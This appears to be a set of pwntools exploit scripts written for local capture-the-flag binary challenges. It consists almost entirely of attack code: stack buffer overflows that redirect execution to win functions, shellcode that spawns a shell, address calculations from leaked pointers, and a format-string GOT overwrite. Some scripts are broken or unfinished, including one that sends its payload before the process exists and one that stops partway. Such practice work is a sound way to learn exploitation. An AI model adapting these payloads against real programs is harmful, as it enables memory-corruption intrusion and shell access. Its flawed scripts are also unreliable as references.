# exploit 0 script
from pwn import *
payload = b"A"*268 + p32(0x69420)
p = process("./a.out")
p.recv()
p.sendline(payload)
p.interactive()

#exploit 1 script
from pwn import *
payload = b"A"*(0x110 - 0x8) + p32(0x1337) + p32(0x69696969)
p.sendline(payload)
p = process("./a.out")
p.sendline(payload)
p.interactive()

#Exploit 2 Script
from pwn import *
payload = b"A" * 0x71 + p32(0x08049182)
p = process("./withoutpie")
p.sendline(payload)
p.interactive()
payload = b"A" * (0x71+0x4) + p32(0x08049182)
p = process("./withoutpie")
p.sendline(payload)
p.interactive()

#Exploit 3 Script
from pwn import *
p = process("./chall_03")
p.recvuntil(b":) ")
leak = int(p.recvline().decode('utf-8').strip(), 16)
context.arch = "amd64"
shellcode = asm(shellcraft.sh())
payload = shellcode
distance = 0x140 - len(payload)
payload += cyclic(distance)
payload += cyclic(0x8)
payload += p64(leak)
p.sendline(payload)
p.interactive()

#Exploit 4 Script
p = process("./chall_04")
p.recv()
payload = b"A" * (0x60 - 0x8) + p64(0x40119d)
payload
p.sendline(payload)
p.interactive()

#Exploit 5 Script


p = process("./chall_05")
leak_output = p.recvuntil(b"I wonder what this is: ")
leak_output
leak = int(p.recvline().strip().split(b":")[-1], 16)
leak
offset = 0x60 -0x8
offset
winfunc = 0x11a9
mainfunc = 0x000011c0
difference = winfunc - mainfunc
newleak = leak + difference
payload = b"A" * (offset) +  p64(newleak)
p.sendline(payload)
p.interactive()


#Exploit 6 Script
from pwn import *

p = process("./chall_06")
leak_output = p.recvuntil(b"I drink milk even though i'm lactose intolerant: ")
addr = p.recvline().strip()
addr
offset = 0x60-0x8
context.arch = "amd64"
shellcode = asm(shellcraft.sh())
payload = b"" + shellcode
p.sendline(payload)
base = int(addr, 16) - offset
# printfAddr = 0x5600867e41a8
# getAddr = 0x5600867e41a8
payload = cyclic(offset)
# payload += p64(leak_output)
payload += p64(int(addr, 16))
# payload += p64(printfAddr)
# payload += p64(getAddr)
p.sendline(payload)
# p.sendline(0x5600867e41ee)
p.interactive()

#Exploit 7 Script
p = process("./chall_07")
context.arch = "amd64"
shellcode = asm(shellcraft.sh())


#Exploit 11 Script
p = process("./chall_11")
elf = ELF("./chall_11")
payload = fmtstr_payload(7, {elf.got.puts: elf.sym.win}, write_size="byte")
payload
p.sendline(payload)
p.interactive()